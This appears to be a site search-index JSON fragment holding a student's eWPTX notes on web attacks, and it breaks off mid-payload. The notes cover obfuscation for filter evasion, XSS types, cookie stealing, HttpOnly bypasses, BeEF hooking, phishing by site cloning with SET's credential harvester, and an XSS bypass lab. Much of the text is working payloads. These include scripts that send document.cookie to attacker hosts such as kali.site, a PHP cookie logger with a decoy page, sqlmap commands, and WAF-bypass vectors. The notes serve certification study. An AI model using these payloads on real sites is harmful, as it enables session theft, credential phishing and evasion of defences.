        "excerpt":"  Base64 Encoding Evasion     Lets suppose that we want to evade a system that inspects Javascript code For specific keywords like eval, alert, prompt, document.cookie, or other potential malicious strings.   A possible way to escapse these kinds of filters is by using Base64 encoding.   Cookie Stealer  To steal cookies, not marked as HttpOnly is relatively easy and we commonly use this JavaScript payload:  location.href = 'http://evilpath;com/?c='+escape(document.cookie)''      however often the document.cookie keyword may be detected and blocked   Use Base64 encoding, we can hide document.cookie code translating the attack vector into:  eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGg7Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))      perhaps the eval function is blacklisted too, so lets see alternatives:   in Javascript:  [].constructor.constructor(\"code\")() //where code equals 'atob(&lt;base64 script&gt;)'   Other valid methods are:  setTimeout(\"code\") #all browsers setInterval(\"code\") #all browsers setImmediate(\"code\")#IE10+ Function(\"code)\"() #all browsers   URI Obfuscation Techniques  URI (Uniform (local/remote) Resource Identifier      It can not only be handy in byṕassing a filtered system, but also to shorten the vector to respect a length limit.   URL Shortening  Its a technique in which a URL may be shorter in length and still direct to the required page.   → https://my.ine.com   → https://tinyurl.com/32f32v49   Running your own URL shortener is simple and there are multiple services and libraries that allow you to start the service easily, such as:   → http://yourls.org/   //free   → https://bitly.com/   //paid   Preview  Some shortening services implement their technique to show the preview or some information abou the shortened link   bitly uses + signal:  - tinyurl uses preview.&lt;url&gt; - moreover: http://security.thejoshmeister.com/2009/04/how-to-preview-shortened-urls-tinyurl.html   There are services that do not provide this feature, such as:      http://t.co/ //used by twitter   For this kind of service, online solutions exists:      http://www.toolsvoid.com/unshorten-url   http://longurl.org/expand   cURL Link Resolver  U can do it manually:  curl -I &lt;short url&gt;   URL Hostname Obfuscation          normally URLs are used in formats like:       → https://hack.me/test       but RFC   RFC 3986 tells us that the these are also valid URLs:   https://hack.me:443   https://[this_is_valid]@hack.me   We want to obfuscate the Authority component of a URI: foo://example.com:8042/over/there?name=ferret#nose                  scheme       authority       path       query       fragment           The Authority component is structured as follows:  [ userinfo \"@\" ] host [ \":\" port ]  # other than the port subcomponent, we can play with the userinfo and host.   Obfuscating with Userinfo  The userinfo subcomponent is used For authentication. If credentials are required to access a resource, they can be included here, and the login will be automatic:  http://'username:password'@www.I-want-login.com/protected_path  # if the page requires NO authentication, the subcomponent text is ignored by both browser and server.   Example:     https://www.google.com@hack.me/t/xss      hack.me does not implement this kind of authentication and will ignore the www.google.com part (userinfo)    In the userinfo subcomponent, Unicode is allowed, therefore, it does not need other additional clarifications if we want add signals or letter of other languages.      not all browser support this obfuscation technique. Firefox and Opera show alert messages.          Obfuscating with Host  Internet names are translated to IP addresses. But there are other ways to represent the same number, such as: Dword, Octal, Hexadecimal.      Dword - google.com  Double Word is known as Integer IP. IP is translated to an equivalent 16bit number.  google.com &gt; 216.58.218.78 &gt; http://3627734862   Octal - google.com  google.com &gt; 216.58.218.78 &gt; http://0330.0072.0327.0116      we can also feed each number by adding leading zeroes without break the original value    Hexadecimal - google.com  http://0xd83ada4e or http://0xd8.0x3a.0xda.0x4e      its also possible to add zeroes like 0x000000d8 …    Hybrid          these are the basic techniques, however, its also possible to mix these and create a hybrid            this tool apply all the techniques discussed       → http://www.silisoftware.com/tools/ipconverter.php   Java Obfuscation Techniques   Non-Alphanumeric  Its way to encode Javascript code by using only non-alphanumeric characters.   String Casting  \"\" + 1234 or 1234 + \"\" # returns \"1234\" [] + 1234 or 1234 + [] # returns \"1234\" x = \"hello\" [1,\"a\",x] # returns [1, \"a\", \"hello\"] [1,\"a\",x]+\"\"  # returns \"1, a, hello\"   Booleans  There are many ways to return a Boolean value using non-alphanumeric characters:                  False       True                 ![ ]       !![ ]                 !{ }       !!{ }                 !!” “       !” “                 [ ]=={ }       [ ]==””           To extract the true or false string:  [!![ ]]+\"\" # returns 'true' [![ ]]+\"\"  # returns 'false'   Numbers     Can be created. true is 1 and false is 0;   to generate 1 we can do true+false and 2 true+true… etc   Examples: number zero 0:                  +””       +[ ]       ![ ]+![ ]                 -“”       -[ ]       ![ ]+!{ }                 -+-+””       -+-+[ ]       ![ ]+!!””              String  How to generate custom strings. For example if we wanna generate the alert string, we need to generate each character separately and then put them together.      Generate alert string   We need to use the string output of native JavaScript objects and extract the characters required. Example:  _={}+[] # is \"[object Object]\" []/[]+\"\" # is \"NaN\" !![]/![]+\"\" # is \"Infinity\"   So to extract the alpha char a we use the Nan String and acces the position 1:  ([]/[]+\"\")[![]+!![]] #\"a\" cause string can be accessed like arrays (\"NaN\")[1]   The remaining alpha characters can be generated using the following messages:  a - \"Nan\", fAlse l - faLse e - truE. falsE or [objEct ObjEct] r - tRue t - True or infiniTy   Encoding  Based on this technique:     JJencode = http://utf-8.jp/public/jjencode.html   Aaencode = http://utf-8.jp/public/aaencode.html   JSFuck   = http://www.jsfuck.com/   → https://github.com/aemkei/jsfuck/blob/master/jsfuck.js      JavaScript Compressing  To make JavaScript run faster, developers often use tools that compile JavaScript into more compact and higher performing code. By using these tools, its also possible to obfuscate code and evade detection. This is what we are going to be looking For in this chapter.   Minifying  The process of minifying JavaScript code is by removing all unnecessary characters without changing the functionality of the original code. Basically, all characters that are used to add readability to the code is removed. These characters are ignored by the interpreter. Examples of these are: whitespaces, new line, comments. Some tools:  Closure compiler - https://developers.google.com/closure/compiler/ YUICompressor    - http://yui.github.io/yuicompressor/ JSMin            - http://crockford.com/javascript/jsmin Packer           - http://dean.edwards.name/packer/  Packing  A packer compresses the minified code by shortening variable names, functions and other operations. In other words, it makes the code unreadable.   PHP Obfuncations Techniques  They ways of PHP obfuscation are infinite…      Basic Language Reference   Type Juggling  PHP is a dynamically typed language. PHP does not require/support explicit type definition in variable declaration Basically, we can declare the same variable and as we assign different values (string, int, etc) the type of the variable changes.  $joke = \"1\" $joke++; $joke = \"a string\"  Numerical Data Types  $x = 'Giuseppe'; echo $x[0];    # decimal index     (0) &gt; 'G' echo $x[0001]; # octal index       (1) &gt; 'i' echo $x[0x02]; # hexadecimal index (2) &gt; 'u' echo $x[0b11]; # binary index      (3) &gt; 's'   Access String / Integer Numbers   How the structure For integer literals are:                  Integer                                         decimal       hexadecimal       octal       binary                 [1-9][0-9]* or 0       0[xX][0-9a-fA-F]+       0[0-7]+       0b[01]+           Access String / Floating Numbers  $x = 'Giuseppe'; echo $x[0.1];             # floating 0.1 casted to 0 (0) &gt; 'G' echo $x[.1e+1];           # exponential       (1) &gt; 'i' echo $x[0.2E+0000000001]; # long exponential  (2) &gt; 'u' echo $x[1e+1-1E-1-5.999]; # exponential and floating expression 3.901 casted to 3 &gt; 's'   How the structure For floating literals are:                  Floating                                                 LNUM       DNUM       EXPONENT_DNUM                                 [0-9]+       ([0-9]*[.]{LNUM})       ({LNUM}[.][0-9]*)       [+-]?(({DNUM}       {DNUM}) [eE][+-]? {LNUM})           Exotic Number Generation  $x = 'Giuseppe'; echo $x[FALSE];                  // false is (0)                 &gt; 'G' echo $x[TRUE];                   // true is  (1)                 &gt; 'i' echo $x[count('hello')+true];    // count(object) is 1 (2)       &gt; 'u' echo $x[\"7rail\"+\"3er\"-TRUE^0xA]; // PHP ignore trailing data (3) &gt; 's'      Its possible to use the casting functionalities PHP provides:   http://www.php.net/manual/en/language.types.type-juggling.php#language.types.typecasting   $x = 'Giuseppe'; echo $x[(int)\"a common string\"]; //(0) &gt; 'G' echo $x[(int)!0];       // True (1)    &gt; 'i' echo $x[(int)\"2+1\"];    // (2)         &gt; 'u' echo $x[(float)\"3.11\"]; // (3)         &gt; 's' echo $x[boolval(['.'])+(float)(int)array(0)+floatval('2.1+1.2=3.3')]; # true(1)+1+2.1=4.2 is (4)            &gt; 'e'   String Data Types  In PHP there are four different ways in which its possible to specify a string literal:  - single quoted - double quoted - heredoc syntax - nowdoc syntax (since PHP 5.3.0  # single quotes ' ' = variable and escape sequences For special chars are not expanded # double quotes \" \" - they are expanded      Escapes  \\n                   # linefeed {LF or 0x04(10) in ASCII) \\r                   # carriage return (CR or 0x0D (13) in ASCII) \\t                   # horizontal tab (HT or 0x09(9) in ASCII) \\v                   # vertical tab (VT or 0x0B(11) in ASCII (since PHP 5.2.5) \\f                   # form feed (FF or 0x0C(12) in ASCII) (since PHP 5.2.5) \\\\                   # backslash \\$                   # dollar sign \\\"                   # double-quote \\[0-7]{1,3}          # sequence of chars matching the regex is a character in octal notation \\x[0-9A-Fa-f]{1,2}   # sequence matching is a hexadecimal notation   Variable Parsing  $s = \"\\x20\"; //space char echo \"I$sLove Beer\"; //theres no $sLove variable &gt; I Beer echo \"I{$s}Love Beer\";  &gt; I Love Beer echo \"I${s}Love Beer\";  &gt; I Love Beer echo \"I{${s}}Love Beer\";&gt; I Love Beer      Even arrays, object methods, class functions with numerical obfuscation are allowed.   Heredoc and Nowdoc     the preferred ways among command-line programmers   The identifier must contain only alphanumeric characters and underscores. It must also start with a non-digit char or underscore, thereby making these examples still valid:   echo &lt;&lt;&lt;™[™&amp;¨}]™⅞  It works! ™⅞;   Complex (curly) Syntax {…}  These are 3 different ways to define a variable named $Beer:  ${'Be'.'er'} = 'Club'; ${'Be'.str_repeat('e',2).'r'} = 'Club'; ${'Be'.str_repeat('e',2).@false./*.*/'r'} = 'Club';   Example of obfuscation:   class beers{   const lovely='rootbeer'; } $rootbeer = 'Club' echo \"I'd like a {${beers::lovely}}!\" //Id like a Club!   Array Data Types  $a = array(x=&gt;123,xx=&gt;456); echo $a['x']; &gt; 123 //normal echo $a[x]; &gt; 123  // index without quotes echo $a[\"\\x78\"]; &gt; 123 // hexa notation echo $a['\\170']; &gt; 123 // octal notation echo $a['x'.@false.\"\\x78\"]; &gt; 456 //normal usage with padding and hex.notation      A simple way to evade WAFs is to not only send your payload encrypted by using GET or POST, but also the key to decrypt via a custom header.   Variable Variables  Its a way to set a variable name dynamically:  $var # variable name $$var # variable of $var variable  $x = 'love'; $$x = 'beer';  echo $x; love echo $$x; beer echo $love; beer echo \"$x ${$x}\"; love beer      its possible to add more dollar signs   with this way, its easy to create code very hard to read.   $_SERVER Superglobal  This is way to access the $_SERVER superglobal  $$$$$$$$$$s = '_SERVER'; var_dump($$$$$$$$$$s); // null var_dump($$$$$$$$$$$s); // string(7) \"_SERVER\" var_dump($$$$$$$$$$$$s); // the $_SERVER array   PHP Non-Alphanumeric Code      http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/   http://www.thespanner.co.uk/2012/08/21/php-nonalpha-tutorial/   Arithmetic Operators     php follows perls convention:        http://php.net/manual/en/language.operators.increment.php       Character variable can only be incremented and not decremented. Only plain ASCII alphabets and digitsw (a-z, A-Z and 0-9) are supported.   Bitwise Operators  Its possible to use bitwise operators on strings. example:  echo A&amp;B; //@ echo A|B; //C echo A^B; //U+0003 END OF TEXT echo ~A; //U+00BE Vulgar fraction three quarters echo A&lt;&lt;B; //0   Native PHP Objects  $a = []; #create an empty array object $a = $a.!![]; # convert the array to string \"Array\" $_ = $__ = ![]&amp;!![]; #true &amp; false generates the int(0) \"0\" $__++; #increment int (0) by one \"1\" $_§ = $__§ = $a[$_]; # Access the position 0 of the 'array' string \"A\" $__§++; #Get the next char after A \"B\" echo $_§|$__§; #echos A|B \"C\"   $_=\"{\" #XOR char echo ($_^\"&lt;\").($_^\"&gt;;\").($_^\"/\"); #XOR magic &gt; 'GET'      hackvertor.co.uk - It has 2 options to encode PHP into non-alphanumeric code.   ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web","bypass"],
        "url": "/notes/ewptx/evasionbasics/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser3.jpg"
      },{
        "title": "3 - Cross-site scripting (XSS)",
        "excerpt":"  XSS   Definition     XSS occurs when a browser renders untrusted content in a trusted environment.   If the content contains dynamic languages such as HTML, JavaScript and others, the browser may execute the untrusted code.   The 4 types:   Reflected XSS  It occurs when untrusted user data is sent to a web application and its immediately echoed back into the untrusted content. Then, as usual, the browser receives the code from the web server response and renders it.   &lt;?php $name = @$_GET['name'];?&gt; Welcome &lt;?=$name?&gt;   Persistent XSS     Rather than the malicious input being directly reflected into the response, its stored within the web application   Once this occurs, its then echoed somewhere else within the web application and might be available to all visitors.   In this scenario, both databases and file system fiels are the target data storage mechanisms.   DOM XSS  Its a form of XSS that exists only within client-side code (typically JavaScript)   It does not reach server-side code. This is the reason why this flaw is also known as Type-0 or Local XSS.   Information we can get are the URL, history, cookies, local storage etc.   There is two keywords: sources and sinks.      In software, data flow can be thought as in water flow in aqueduct systems which starts from natural sources and ends to sinks. In software security the sources are to be considered starting points where untrusted input data is taken by application.       Sinks are meant to be the points in the flow where data depending from sources is used in a potentially dangerous way resulting in loss of Confidentiality, Integrity or Availability.    → Moreover DOM XSS: https://code.google.com/p/domxsswiki/   Universal XSS     Aka UXSS   it dows not leverage the flaws against web applications but the browser, its extensions or its plugins.   XSS Attacks   Cookie Gathering     The main techniques to keep track of user session is by using HTTP cookies.   Sometimes these cookies contain information such as username, password, and other application related information.   3 steps:  - Script Injection - Cookie Recording - Logging   Script Injection  Inject the malicious payload that will send the stolen cookies to our controlled CGI Accessing Cookies:  var accessibleCookies = document.cookie;   AccessibleCookies is a string containing a semicolon-separated list of cookies in key=value pairs. The result contains cookies without the HTTPOnly attribute. On HTTP connections, only cookies without the SECURE attribute set are contained in the result.   Stealing Cookies To steal cookies, we need to send the document.cookie content to something we can control, using a simple script like:  new Image().src=\"http://kali.site/C.php?cc=\"+escape(document.cookie);         Cookie Recording &amp; Logging:   Once the client-side has performed the request to our controlled CGI, its time to handle the request and manage the parameter sent.   Here, we define which information to collect, how to store it and the action to perform once this valuable information is obtained.   Lets suppose we have our PHP script C.php listening on our kali machine   A basic example is to store the GET[‘cc’] content in a file.  &lt;?php error_reporting(0); #turn off all error reporting $cookie = $_GET['cc']; #request to log $file = '_cc_.txt'; #the log file $handle = fopen($file,\"a\"); # open log file in append mode fwrite($handle,$cookie.\"\\n\"); # append the cookie fclose($handle); #append the cookie echo '&lt;h1&gt;Page Under Construction&lt;/h1&gt;'; #trying to hide suspects &gt;      Once we obtain the desired cookie, we can do several operations in addition to logging. Some examples are as follows:     a request to an API that requires the stolen cookies (impersonation)   notify the attacker via email      simple solution is to use netcat    netcat -lvvp 80 &lt;script&gt; new Image().src=\"kali ip\"+escape(document.cookie); &lt;/script&gt;   Bypassing HTTPOnly Flag  This flag forces the browser to handle the cookie only when trasmitting HTTP request; thus; For client-side scripting languages (IE: JavaSCript), these cookies are practically invisible.   Cross-Site Tracking (XST)  TRACE connection:  curl &lt;victim.site&gt; -X TRACE -H \"Test: test-header\"   In JavaScript, there is the XMLHttpRequest object that provides an easy way to retrieve data from a URL.      this technique is very old and consequently modern browsers BLOCK the HTTP TRACE method in XMLHttpRequest and in other scripting languages and libraries such as JQuery, Silverlight, Flag/ACtionScript, etc.       CVE:2012-0053 aka Apache HTTPOnly Cookie Disclosure     Another way to access HTTPOnly cookies is exploiting web server bugs   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0053   This example is related to the infamous Apace HTTP Server 2.2.x through 2.2.21 Its possible to create and then sned a burst of large cookies that then generates the 400 error page. We can then just read the response that will definitely contain the HTTPOnly cookies.   PoC = https://gist.github.com/pilate/1955a1c28324d4724b7b      In BeEF there is a module named Apache Cookie Disclosure, which is available under the Exploits section.   BeEF Tunneling Proxy  An alternative to stealing protected cookies is to use the victim browser as a proxy.      We can do this by using Tunneling Proxy in BeEF. This feature allows you to tunnel requests through the hooked browser.   Its also effective against web developer protection techniques such as using multiple validations like User-Agent, IP, custom headers, etc.   Defacements     Instead of injecting malicious code that runs behind the scenes and performs evil operations (cookie stealing) with this attack method the malicious intent is to give a precise message or misleading information to users of the attacked applications. Examples:     http://www.xssed.com/news/110/Norton_Update_Center_critical_XSS_vulnerability/ http://news.netcraft.com/archives/2008/04/24/clinton_and_obama_xss_battle_develops.html http://zerosecurity.org/2013/01/mit-hacked-defaced-by-anonymous           Virtual Defacement     Exploit a XSS flaw that does not modify the content hosted on the target web application.   Typically, this is what happens when abusing Reflected XSS flaws.   Persistent Defacement     WHen a defacement becomes persistent. In this case the attacked page is modigied permanently and, despite the Virtual Defacement type here, the attacker does not need to fool users into visiting a crafted URL.   Phising     The act of attempting to acquire sensitive information such as usernames, passwords, and credit card details (and sometimes, indirectly, money) by masquerading as a trustworthy entity in an electronic communication.   Fundamental steps:     Create a fake website that will contain the malicious code the attacker wants to execute.   Basic Example:     Perform a XSS phishing, alter the action attribute of the &lt;FORM&gt; tag in order to hijack the submitted form input.      We are assuming that the XSS flaw page is in the same page of the stolen form; if its not, we need to leverage the XSS flaw to access the form we have targeted (example: opening the page)       IN this case the defenses fail because the phishing website is the actual website.    Cloning a Website  If we want to clone an existing website or clone and inject a payload, then we may use one of the following tools:  GNU Wget BeEF SET site cloner   Choosing a Domain Name     Once the website has been cloned, you should consider where you will host the phishing site.   The more the domain name is similar to the victims domain name the better.   Add typos and playing with characters variations is the best call.   Tool:  URLCrazy usage: urlcrazy &lt;www.google.com&gt;   Keylogging     Sometimes is helpful to know what our victim is typing during their activity on a targeted website.   We need client-side code that captures the keystrokes and server-side code that stores the keys sent.   JavaScript Example      The most known frameworks also includes a keylogging feature:  Metaslpoit - http_javascript_keylogger BeEF - event logger   Keylogging with Metasploit  auxiliary/server/capture/http_javascript_keylogger      it creates the JS payload and start the listening server   this module creates a DEMO PAGE For us. Just enable the DEMO option to with set DEMO true.   Keylogging with BeEF     its the upgraded version of the previous examples.   These logs are available For the administration user interface in the Logs tab, while withing the console they are printed as they occur.   Network Attacks     At a network layer we can obtain access to varieties of services that would otherwise be unavailable over HTTP.   Like email services, fax and print services, internal web servers and more   IP Detection     Retrieve as much information as possible   My Address Java Applet - http://reglos.de/myaddress/MyAddress.html //user interaction is needed      its usually blocked, u need to lower java security and allow the page to run the application   HTML5 WebRTC feature:  ipcalf - http://net.ipcalf.com/ improved version -  https://hacking.ventures/local-ip-discovery-with-html5-webrtc-security-and-privacy-risk/  # this scan local ips and other alive hosts  # its not supported by all browser, IE and safari do not support this.   Subnet Detection  The browser Hackers handbook: http://browserhacker.com/code/Ch10/index.html   Identifying Internal Network Subnets   Steps:  - Start from a set of most common default gateway IP ranges - Test a subset of probable IPs in the subnet - Results... in red the discovered hosts   Ping Sweeping  Two approaches:  - Java Applets - The same approach used before to detect subnets   Instead of testing only a couple of IPs, we will check the entire subnet.   XHR technique:     if a response arrives in a short amount of time then the host is alive; otherwise, after a defined threshold, the host is down.   Since this approach is time based, network latencies, browser networking characteristics, etc. may increase the number of false positives.   Port Scanning  PDP portscan in JS: http://web.archive.org/web/20100626084549/http:/www.gnucitizen.org/static/blog/2006/08/jsportscanner.js   - PDP uses &lt;img&gt; tag and DOM events to detect whether a port on a specific host is opened or closed. - The idea is to set the image source on a specific port of the target host in order to let the browser know to perform a TCP connection to the defined port and then analyze the events.  - with Cross-Origin Resource Sharing (CORS) and WebSocket, both of which are new HTML5 features, its also possible to scan networks and ports. - JS-Recon  = http://web.archive.org/web/20120308180633/http:/www.andlabs.org/tools/jsrecon/jsrecon.html # a network reconnaissance tool writen in JavaScript   Self-XSS     In this attack, the goal is to trick victims into pasting malicious code into a browser URL bar or console.   Example: http://www.zdnet.com/facebook-flooded-with-porn-spam-3040094432/   Bypass   browsers based on Chromium strip the javascript part.  # So we can copy and paste &lt;enter&gt; # Or we can drag and drop  JavaScript:alert('Self-XSS')  # Using Data Scheme works with the same methods data:text/html,&lt;script&gt;alert('Self-XSS')&lt;/script&gt;  # We can encode the script with Base64. It works the same.   Based on Firefox     Mozilla Firefox disallows access to the security context of the currently loaded page if that access is attempted by javascript or data-scheme URIs entered directly into the browsers location bar.   Anyway its possible to execute redirects or other malicious operations with both schemes.   Redirect to hacker.site with javascript scheme:  javascript:{this.window='&lt;script&gt;document.location=\"http://hacker.site\"&lt;/script&gt;'};   Redirect to hacker.site with data scheme:  data:text/html,&lt;script&gt;document.location=\"http://hacker.site\"&lt;/script&gt;   Access objects in the DOM via bookmarks  in images:  1. Create a bookmark: Alert cookies &gt; javascript:alert(document.cookie) 2. Click 3. Browser execute JavaScript # this bookmarks technique is also valid in browsers like Chromium, Internet Explorer and Safari   Internet Explorer     data scheme is limited, but javascript is available   The only limit is similar to Chormium browsers, it will strip any leading javascript: from the pasted text before inserting into the search bar:  javascript:document.location='http://hacker.site'   Safari     Denies javascript from the Smart Search Field but is allowed within bookmarks   The data scheme is allowed too   NoScript Security Suite     Its a firefox extension, adds an additional security layer blocking all javascript and data URIs   In contrast, as with other browsers, it does not block javascript and data URI schemes within Bookmarks.   Exotic XSS Vectors   mXSS - Mutation-Based     This is a class of XSS vectors, which may occur in innerHTML and related FOM properties.   With these kind of mutations, harmless string that clearly pass all XSS filters are transformed into XSS attack vectors by the browser layout engine itself.   Its an old technique, works in IE8 or older   To test: http://html5sec.org/innerhtml   moreover: http://www.businessinfo.co.uk/labs/mxss/  &lt;listing&gt;&amp;amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/listing&gt;   Create an external IP to get requests  You can use NGROK or localtunnel to open an external IP to receive cookies For example.  https://github.com/inconshreveable/ngrok https://github.com/localtunnel/localtunnel   This script can help to steal cookies:  https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py   Notes from Video   1 - Keylogging   Metasploit:  service postgresql start service metasploit start ```bash  DOM XSS: ```js &lt;img/src=x style=\"display:none\" onerror=\"s=document.createElement('script'); s.setAttribute('src','&lt;beef hook&gt;');document.head.appendChild(s)\"&gt;   2 - From an XSS to a SQL Injection  BeEF &gt; Rider &gt; Forge Request   PoC XSS:  &lt;span onmouseover=\"console.info('sounds good')\"&gt;Great site&lt;/span&gt;   Inject the BeEF hook:  random message&lt;script src=\"beef hook\"&gt;&lt;/script&gt;  in BeEF &gt; click in the target IP &gt; use as Proxy - configure a browser proxy such as foxyproxy - 127.0.0.1:8080 - ignore proxy For localhost, 127.0.0.1, &lt;our ip&gt;   in BURP:  - Options &gt; Connections &gt; Upstream Proxy Server - Destination Host:* - Proxy Host: 127.0.0.1 - Proxy Port: 6789  - Target &gt; Scope - Host: &lt;target domain or IP&gt;   SQLMAP:  sqlmap -u \"&lt;target url/search?rnd=a1a1&amp;name=a&gt;\" -p name --proxy=\"http://127.0.0.1:8080\" --randomize rnd --dbms=mysql --technique=U --union-cols=7-10 --prefix \"'\" --sufix \" # \" --banner sqlmap -u \"&lt;target url/search?rnd=a1a1&amp;name=a&gt;\" -p name --proxy=\"http://127.0.0.1:8080\" --current-db sqlmap -u \"&lt;target url/search?rnd=a1a1&amp;name=a&gt;\" -p name --proxy=\"http://127.0.0.1:8080\" -D &lt;name of the db&gt; --tables sqlmap -u \"&lt;target url/search?rnd=a1a1&amp;name=a&gt;\" -p name --proxy=\"http://127.0.0.1:8080\" -D &lt;DBs name&gt; -T &lt;TABLEs name&gt; --collums    3 - Website Cloning  # edit /etc/hosts &gt; add 127.0.0.1 cloned.test cd /etc/apache2/sites-available &gt; cp default cloned.test  # edit clonet.test &gt; add ServerName cloned.test &gt; edit DocumentRoot /var/www/cloned.test a2ensite cloned.test service apache2 reload  cd /var/www/cloned.test echo 'Hello World' &gt; index.html test in browser   Clone with wget  cd /var/www/cloned.test/ wget -mK -nH &lt;target site&gt;   Clone with BeEF  beef -x   in shell:  curl -H \"Content-Type: application/json; charset=UTF-8\" \\ -d '{\"url\":\"&lt;target URL&gt;\", \"mount\":\"/amazon\"}' \\ -X POST http://127.0.0.1:3000/api/seng/clone_page?token=&lt;API key from BeEF console&gt;   - Go to the browser and visit the address - localhost:3000/amazon # with beef its cloned + its automaticaly hooked  # If the user type anything like user:password it will be redirect to the original site and BeEF will capture any info   in BeEF GUI:  Current Browser &gt; Commands &gt; Browser &gt; Hooked Domain &gt; Create Prompt Dialog &lt;write something&gt; - Execute   Create a Similar Targets Domain with URLCRAZY  urlcrazy &lt;target URL&gt;   Cloning with The Social-Engineer Toolkit  setoolkit   in shell:  cd /usr/share/set/config;  cp set_config set_config.bkp edit set_config &gt; APACHE_DIRECTORY=/var/www/cloned.test edit HARVESTER_LOG=/var/www/cloned.test/   in SET:  1 - Social-Engineer Attacks 2 - Website Attack Vectors 3 - Credential Harvester Attack Method 2 - Site Cloner # &lt;in real scenarios we need to configure an external IP address, in this case well skip&gt; # &lt;enter the URL to clone&gt;      test in browser the cloned site    cd /var/www/cloned.test/ edit index.html add in responseBody &gt; (\"An error has occurred, Please Retry!\"); add setTimeout(function(){document.location.href=\"&lt;the original URL of the target&gt;\";},2000); clean other lines that are not useful to the code   mv post.php login.php  # because the javascript want a login.php page  insert login:password in the test cloned site, it should redirect to the original after the try  go to /var/www/cloned.test/ cat harvester file   # it should show the login:password captured   Lab - 11 Levels to Bypass XSS   1 - normal  &lt;script&gt;alert(\"l33t\")&lt;/script&gt;   2 - bypass script  &lt;script&lt;script&gt;&gt;alert(\"l33t\")&lt;/script&gt;   3 - no script allowed  &lt;img/src onerror=alert(\"l33t\")&gt;   4 - no script / no ON allowed  &lt;svg&gt;&lt;script&gt;alert('l33t')   5 - no ON, no functions  &lt;svg&gt;&lt;script&gt;alert&amp;lpar;'l33t'&amp;rpar;   6 - no alert  &lt;script&gt;\\u0061lert('l33t')&lt;/script&gt;   7 - No Unicode escaping / no alert  &lt;script&gt;eval('\\x61lert(\\'l33t\\')')&lt;/script&gt;   8 - No alert / no products  [NL]eval('x61lert(\\'l33t\\')' &lt;/Title/&lt;/script/&gt;&lt;Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`l33t` //&gt;# &lt;/Title/&lt;/script/&gt;&lt;img src=x onerror=\"\\u0061lert('l33t')\"/&gt;# &lt;/script&gt;&lt;svg onload=\"eval(atob('YWxlcnQoJ2wzM3QnKQ=='))\"&gt;    9 - stronger bypass - no alert / no products  [\\u2028]eval('x61lert(\\'l33t\\')' &lt;/Title/&lt;/script/&gt;&lt;Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`l33t` //&gt;# &lt;/Title/&lt;/script/&gt;&lt;img src=x onerror=\"\\u0061lert('l33t')\"/&gt;# &lt;/script&gt;&lt;svg onload=\"eval(atob('YWxlcnQoJ2wzM3QnKQ=='))\"&gt;    10 - no string / no alert /  &lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt;   11 - no scripts / dont break src tag  http://11.xss.labs%2f@hacker.site/X.js  ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/xss/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser4.jpg"
      },{
        "title": "4 - XSS Filter Evasion",
        "excerpt":"  Filter Evasion and WAF Bypassing   https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet  http://html5sec.org/      Common scenarios      The XSS vector is blocked by the application or something else   The XSS vector is sanitized   The XSS vector is filtered or blocked by the browser   Bypassing Blackliting Filters   Its the most common. Their goal is to detect specific patterns and prevent malicious behaviors.   Inject Script Code  &lt;script&gt;  # The &lt;script&gt; tag is the primary method which can be used to execute client-side scripting code such as javascript.   Bypassing Weak script Tag Banning  - Upper and Lower-case characters - Upper and Lower-case without closing tag - Random string after the tag name - Newline after the tag name - Nested tags - NULL byte (IE up to v9) # examples in images   ModSecurity &gt; Script Tag Based XSS Vectors Rule  There are several alternatives in which its possible to run our code, such as different HTML tags and related event handlers.   Beyond script Tag… Using HTML Attributes  &lt;a href=\"javascript:alert(1)\"&gt;show&lt;/a&gt; &lt;a href=\"data:text/html;base64,&lt;alert(1) encoded&gt;\"show&lt;/a&gt; &lt;form action=\"javascript:alert(1)\"&gt;&lt;button&gt;send&lt;/button&gt;&lt;/form&gt; &lt;form id=x&gt;&lt;/form&gt;&lt;button form=\"x\" formaction=\"javascript:alert(1)\"&gt;send&lt;/button&gt; &lt;object data=\"javascript:alert(1)\"&gt; &lt;object data=\"data:text/html;base64, &lt;alert(1) encoded&gt;\"&gt;  # https://github.com/evilcos/xss.swf &lt;object data=\"//hacker.site/xss.swf\"&gt; &lt;embed code=\"//hacker.site/xss.swf\" allowscriptaccess=always&gt;   Beyond script Tag… Using HTML Events     Events are they way that HTML DOM adds interactivity between the website and its visitors; This happens simply by executing the client-side code (e.g, JavaScript)   Almost all event handler identifier start with on and are followerd by the name of the event. One of the most used is onerror:  &lt;img src=x onerror=alert(1)&gt;   → but, there are maybe other events: http://help.dottoro.com/lhwfcplu.php   Examples:  &lt;body onload=alert(1)&gt; &lt;input type=image src=x:x onerror=alert(1)&gt; &lt;isindex onmouseover=\"alert(1)\" &gt; &lt;form oninput=alert(1)&gt;&lt;input&gt;&lt;/form&gt; &lt;texarea autofocus onfocus=alert(1)&gt; &lt;input oncut=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;keygen autofocus onfocus=alert(1)\"&gt; &lt;video&gt;&lt;source onerror=\"alert(1)\"&gt; &lt;marquee onstart=alert(1)&gt;      From a defensive point of view, the solution is to filter all the events that start with on in order to block this injection point.   This is a very common regex you might find used widely:  (on\\w+\\s*=)  # We can bypass this filter: &lt;svg/onload=alert(1)&gt; &lt;svg//////onload=alert(1)&gt; &lt;svg id=x; onload=alert(1)&gt; &lt;svg id='x' onload=alert(1)&gt;   So, we have an Upgrade:  (?i)([\\s\\\"'`;\\/0-9\\=]+on\\w+\\s*=)      However, Some browsers convert the control character to a space, thus the \\s meta-character is not enough to cover all possible chars.   We can bypass that too:  &lt;svg onload%09=alert(1)&gt; # Works in all browsers except Safari &lt;svg %09onload=alert(1)&gt; &lt;svg %09onload%20=alert(1)&gt; &lt;svg onload%09%20%28%2C%3B=alert(1)&gt; &lt;svg 